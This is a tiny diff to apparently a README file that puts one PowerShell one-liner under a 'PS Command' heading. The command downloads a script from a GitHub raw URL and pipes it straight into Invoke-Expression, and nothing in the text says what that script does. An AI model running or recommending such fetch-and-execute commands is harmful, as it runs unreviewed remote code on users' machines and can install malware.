@@ -1,1 +1,5 @@
-```iwr https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/a.ps1 | iex```
+## PS Command
+
+```ps1
+iwr https://raw.githubusercontent.com/Ksawix0/mitoza/refs/heads/main/a.ps1 | iex
+```
